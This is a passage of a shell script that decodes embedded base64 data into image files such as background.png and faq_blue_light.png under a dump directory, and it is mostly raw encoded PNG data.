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" | base64 --decode>$DUMP_PATH/data/background.png

echo "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" | base64 --decode>$DUMP_PATH/data/faq_blue_light.png

echo "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
